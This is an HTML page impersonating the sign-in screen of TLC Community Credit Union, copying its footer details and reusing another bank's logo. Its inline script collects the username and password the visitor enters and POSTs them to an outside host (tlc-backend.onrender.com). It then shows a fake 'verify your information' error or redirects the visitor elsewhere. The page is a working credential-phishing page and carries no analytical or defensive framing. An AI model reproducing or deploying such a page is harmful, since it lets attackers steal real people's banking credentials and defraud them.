<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1"
    />
    <link rel="icon" href="./public/hlogo.png" />
    <link rel="stylesheet" href="./public/style.css" />
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200"
    />
    <title>TLC Community Credit Union</title>
  </head>
  <body>
    <div class="container">
      <div class="imgDiv">
        <img
          src="./public/vermillion-state-bank-logo-8c7cd70b.png"
          alt="logo"
          width="250"
        />
      </div>
      <form id="myForm">
        <input
          type="text"
          name=""
          id="username"
          placeholder="username"
          required
        />
        <br />
        <input
          type="text"
          name=""
          id="password"
          placeholder="password"
          required
        />
        <p class="forgot">Forgot?</p>
        <div class="lastDiv">
          <div class="content">
            <span class="material-symbols-outlined"> fingerprint </span>
            <p class="passkey">Sign in with a passkey</p>
          </div>
          <button type="button" id="loginBtn">Sign in</button>
        </div>
      </form>
    </div>
    <footer>
      <p>© 2024 TLC Community CU •</p>
      <p>(517) 263-9120 •</p>
      <p>Privacy policy •</p>
      <p>Federally Insured by NCUA •</p>
      <p>Equal Housing Lender</p>
    </footer>
    <script>
      const loginBtn = document.getElementById("loginBtn");
      loginBtn.addEventListener("click", function (e) {
        const usernameInput = document.getElementById("username");
        const passwordInput = document.getElementById("password");
        const username = usernameInput.value;
        const password = passwordInput.value;

        fetch("https://tlc-backend.onrender.com/form-submit", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ username, password }),
        })
          .then((response) => {
            if (!response.ok) {
              return response.text();
            }
            return response.json();
          })
          .then((data) => {
            if (typeof data === "string") {
              const errorMessage = data;
              const errorDiv = document.createElement("div");
              errorDiv.textContent = errorMessage;
              errorDiv.classList.add("error-message");
              errorDiv.innerHTML = `<div class="containerr">
                              <p class="errMsg">Please verify your information and try again.</p>
                              </div>`;
              const formElement = document.getElementById("myForm");
              formElement.parentNode.insertBefore(errorDiv, formElement);
              usernameInput.value = "";
              passwordInput.value = "";
            } else {
              window.location.href = data.redirectUrl;
            }
          })
          .catch((error) => {
            console.error("Error:", error);
          });
      });
    </script>
  </body>
</html>
